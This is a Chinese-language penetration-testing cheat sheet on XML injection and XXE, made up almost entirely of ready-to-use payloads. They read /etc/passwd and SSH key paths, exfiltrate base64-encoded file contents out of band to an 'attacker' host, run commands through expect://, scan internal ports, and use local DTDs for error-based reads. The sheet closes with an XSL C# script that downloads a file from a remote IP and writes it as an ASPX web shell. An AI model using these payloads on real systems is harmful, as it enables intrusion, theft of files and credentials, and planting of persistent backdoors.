	XML设计的宗旨是传输数据，而非显示数据
	XXE=XML外部实体注入、XML=可扩展标记语言
	Xml文件声明
	<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
	DTD为XML的文档类型定义
	引入外部DTD
	<!DOCTYPE 根元素 SYSTEM "filename">
	参数实体+外部实体
	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE test [
		<!ENTITY % file SYSTEM "file:///etc/passwd">
		%file;
	]>
  #### XML注入
	闭合标签，改写xml文件，用户可控，有拼接代码
	<?xml version="1.0" encoding="utf-8"?>
	<manager>
		<admin id="1">
    <username>admin</username>
    <password>admin</password>
    </admin>
    <admin id="2">
    <username>root</username>
    <password>root</password>
    </admin>
	</manager>
	若是password可控，拼接代码形成注入
	admin </password></admin><admin id="3"><name>hack</name><password>hacker</password></admin>
  #### XXE
	https://github.com/AonCyberLabs/xxe-recursive-download
	程序解析XML输入时，未禁止外部实体的加载，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害
    判断
	回显路径
		<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "test">%remote;]>
	DNSLOG
		http://www.dnslog.cn/
	<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY dtd SYSTEM "http://xxx.dnslog.cn/xxe">]>
	<xxe>&dtd;</xxe>
	Webdav
		存在webdav可使用PROPPATCH、PROPFIND、 LOCK等请求方法接受xml输入形成xxe
	Wsdl使用AWVS测试
    挖掘
	如遇与xml交互的地方
	<?xml version="1.0" encoding="UTF-8"?> 
	<!DOCTYPE ANY [  
	<!ENTITY test "this is test"> 
	]> 
	<root>&test;</root>
	看是否输出
	检查是否支持外部实体
	<?xml version="1.0" encoding="UTF-8"?> 
   	<!DOCTYPE ANY [  
   	<!ENTITY % foo SYSTEM "http://attacker/evil.xml"> 
   	%foo;
	]> 
	查看你的服务器是否有请求
	JSON content-type XXE
	修改Content-Type: application/xml
	X-Requested-With: XMLHttpRequest
	<?xml version="1.0" encoding="UTF-8" ?>
	<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
	<root>
	<参数name>name</参数name>
	<参数value>&xxe;</ 参数value>
	</root>
    有回显读取本地文件
	<?xml version="1.0" encoding="utf-8"?> 
	<!DOCTYPE creds [  
	<!ENTITY goodies SYSTEM "file:////etc/passwd"> ]> 
	<creds>&goodies;</creds>
	也可去掉文件列目录
	file:///root/.sh/id_rsa
	特殊字符
	<?xml version="1.0" encoding="utf-8"?> 
	<!DOCTYPE roottag [
	<!ENTITY % start "<![CDATA[">   
	<!ENTITY % goodies SYSTEM "file:////tmp/xxx.txt">  
	<!ENTITY % end "]]>">  
	<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> 
	%dtd; ]> 
	<roottag>&all;</roottag>
	evil.dtd
	<?xml version="1.0" encoding="UTF-8"?> 
	<!ENTITY all "%start;%goodies;%end;">
    Blind OOB XXE无回显读取
	需使用参数实体，引用外部DTD
	Payload
	<!DOCTYPE convert [ 
	<!ENTITY % remote SYSTEM "http://ip/test.dtd">
	%remote;%int;%send;
	]>
	test.dtd
	<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
	<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://attacker:9999?p=%file;'>">
    列目录
	远程payload
	<!ENTITY % a SYSTEM "file:///"> <!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://ip:80/%a;'>"> %b; %c;
	注入payload
	<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker:80/1.xml">%remote;]><root/>

    不同平台支持的协议
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/11.png)
    执行命令
	安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。
	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE xxe [
	<!ELEMENT name ANY >
	<!ENTITY xxe SYSTEM "expect://id" >]>
	<root>
	<name>&xxe;</name>
	</root>
    内网主机探测
	可先读取/etc/network/interfaces、/proc/net/arp、/etc/hosts等文件查询IP段
	使用脚本
    内网端口扫描
	<?xml version="1.0" encoding="utf-8"?>  
	<!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  
	<!ELEMENT data (#PCDATA)>  
	]>
	<data>4</data>
	可使用burpsuite的intruder模块进行遍历
    内部DTD利用
    Linux
	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
	<!ENTITY % ISOamsa 'Your DTD code'>
	%local_dtd;
    Windows
	<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
	<!ENTITY % SuperClass '>Your DTD code<!ENTITY test "test"'>
	%local_dtd;
	<?xml version="1.0" ?>
	<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">

    <!ENTITY % condition 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
	]>
	<message>any text</message>
    XXE写shell
	当XXE支持XSL时
	<?xml version='1.0'?>
	<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:user="http://mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="user">
	<![CDATA[
	public string xml()
	{
	    System.Net.WebClient webClient = new System.Net.WebClient();
	    webClient.DownloadFile("https://x.x.x.x/shell.txt",
                       @"c:\inetpub\wwwroot\shell.aspx");
	
    return "Exploit Success";
	}
	]]>
	</msxsl:script>
	<xsl:template match="/">
	<xsl:value-of select="user:xml()"/>
	</xsl:template>
	</xsl:stylesheet>
